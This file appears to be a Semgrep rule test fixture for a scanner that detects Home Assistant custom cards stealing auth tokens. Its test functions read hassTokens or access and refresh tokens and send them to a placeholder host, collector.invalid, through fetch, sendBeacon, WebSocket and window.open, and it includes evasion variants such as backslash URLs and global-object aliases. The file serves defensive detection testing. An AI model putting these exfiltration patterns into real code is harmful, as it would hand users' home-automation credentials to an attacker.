function steal() {
  // ruleid: card-read-tokens
  const raw = localStorage.getItem("hassTokens");
  // ruleid: card-token-exfil
  fetch("https://collector.invalid/c", { method: "POST", body: raw });
}

function steal2(hass) {
  // ruleid: card-access-token-use
  const t = hass.auth.data.access_token;
  // ruleid: card-token-exfil
  navigator.sendBeacon("https://collector.invalid/b", t);
}

function steal3(hass) {
  // ruleid: card-access-token-use
  const t = hass.auth.data.refresh_token;
  const ws = new WebSocket("wss://collector.invalid/ws");
  // ruleid: card-token-exfil
  ws.send(t);
}

function legit(hass) {
  // ruleid: card-access-token-use
  const token = hass.auth.data.access_token;
  // ok: card-token-exfil
  fetch("/api/camera_proxy/camera.front", { headers: { Authorization: `Bearer ${token}` } });
  // ok: card-token-exfil
  fetch(hass.hassUrl("/api/history"), { headers: { Authorization: `Bearer ${token}` } });
  // ok: card-token-exfil
  hass.callApi("GET", "states");
}

// (M6) Relative prefixes built into URLs stay same-origin (seen in a real card).
function legitBuilt(n, t) {
  var i;
  // (0.14.0) The rule no longer uses constant propagation, so it reports this line; the
  // scan's js_wrapper step proves it same-origin and drops it (tests/test_js_wrapper.py).
  // ruleid: card-token-exfil, card-access-token-use
  return t.prev=0,i="/api/printer_hub/file_cache/".concat(n.thumbnail_path),t.next=4,fetch(i,{headers:{Authorization:"Bearer ".concat(this._hass.auth.data.access_token)}});
}

function legitPlus(hass, n) {
  // ruleid: card-access-token-use
  fetch("/api/x/" + n, { headers: { Authorization: hass.auth.data.access_token } });
}

// (M6) ...but not when the variable ends up somewhere else, or the prefix can become "//".
function stealReassigned(hass, n) {
  var u = "/api/x/".concat(n);
  u = "https://collector.invalid/c";
  // ruleid: card-token-exfil, card-access-token-use
  fetch(u, { headers: { Authorization: hass.auth.data.access_token } });
}

function stealBackslash(hass) {
  // Browsers read "/\host" as "//host".
  // ruleid: card-token-exfil, card-access-token-use
  fetch("/\\collector.invalid/c", { headers: { Authorization: hass.auth.data.access_token } });
}

function stealBareSlash(hass, n) {
  // ruleid: card-token-exfil, card-access-token-use
  fetch("/".concat(n), { headers: { Authorization: hass.auth.data.access_token } });
}

function stealOneBranch(hass, n, k) {
  var u = "https://collector.invalid/";
  if (k) { u = "/api/".concat(n); }
  // ruleid: card-token-exfil, card-access-token-use
  fetch(u, { headers: { Authorization: hass.auth.data.access_token } });
}

// (0.14.0) A destructured name shadowing a relative constant: Semgrep's constant
// propagation used to read C as "/api/c" here, so none of these were reported.
const C = "/api/c";
function stealDestructuredParam(hass, { C }) {
  // ruleid: card-token-exfil, card-access-token-use
  fetch(C + "/x", { headers: { Authorization: hass.auth.data.access_token } });
}

function stealDestructuredLocal(hass, p) {
  const [C] = p;
  // ruleid: card-token-exfil, card-access-token-use
  fetch(C + "/x", { headers: { Authorization: hass.auth.data.access_token } });
}

// (0.14.0) The same calls reached through a global object, plain or by computed name.
// 0.13.0 knew only a bare `fetch(…)`, so none of these were reported.
function stealWindowFetch() {
  // ruleid: card-read-tokens
  const t = localStorage.getItem("hassTokens");
  // ruleid: card-token-exfil
  window.fetch("https://collector.invalid/c", { method: "POST", body: t });
  // ruleid: card-token-exfil
  self.fetch("https://collector.invalid/c", { method: "POST", body: t });
  // ruleid: card-token-exfil
  globalThis["fetch"]("https://collector.invalid/c", { method: "POST", body: t });
  // ruleid: card-token-exfil
  window.navigator.sendBeacon("https://collector.invalid/b", t);
  // ruleid: card-token-exfil
  const ws = new window.WebSocket("wss://collector.invalid/ws?t=" + t);
  // ruleid: card-token-exfil
  window.open("https://collector.invalid/o?t=" + t);
}

function stealStorageByShape() {
  // ruleid: card-read-tokens
  const a = globalThis["localStorage"]["getItem"]("hassTokens");
  // ruleid: card-token-exfil
  fetch("https://collector.invalid/c", { method: "POST", body: a });
  // ruleid: card-read-tokens
  const b = window.localStorage["hassTokens"];
  // ruleid: card-token-exfil
  fetch("https://collector.invalid/c", { method: "POST", body: b });
}

function legitWindowFetch(hass) {
  // ruleid: card-access-token-use
  const token = hass.auth.data.access_token;
  // ok: card-token-exfil
  window.fetch("/api/camera_proxy/camera.front", { headers: { Authorization: `Bearer ${token}` } });
  // ok: card-token-exfil
  window.fetch(hass.hassUrl("/api/history"), { headers: { Authorization: `Bearer ${token}` } });
}

function ownClientMethod(hass) {
  // ruleid: card-access-token-use
  const token = hass.auth.data.access_token;
  // A card's own client object's `fetch` method, not the browser's: the call to the
  // browser's fetch inside that client is what the rule checks.
  // ok: card-token-exfil
  this.client.fetch("https://api.example.invalid/x", { headers: { Authorization: token } });
}

// A name or key held in a constant, or folded by Semgrep ("hass" + "Tokens"): this rule
// has no constant propagation, so the second pass's card-token-exfil-const reports these
// (tests/rules_const/js/token-exfil-const.js). Names joined with .join(), fromCharCode,
// atob or escapes are written back in place by js_fold first (tests/test_js_fold.py).
function leftToTheSecondPass() {
  // ruleid: card-read-tokens
  const k = "hass" + "Tokens";
  // ruleid: card-read-tokens
  const t = localStorage.getItem(k);
  // ok: card-token-exfil
  fetch("https://collector.invalid/c", { method: "POST", body: t });
}

// (0.14.0) The global object under another name, bound at the top and used later.
const G = globalThis;
function stealThroughAlias() {
  // ruleid: card-read-tokens
  const t = localStorage.getItem("hassTokens");
  // ruleid: card-token-exfil
  G.fetch("https://collector.invalid/c", { method: "POST", body: t });
  // ruleid: card-token-exfil
  G["fetch"]("https://collector.invalid/c", { method: "POST", body: t });
}
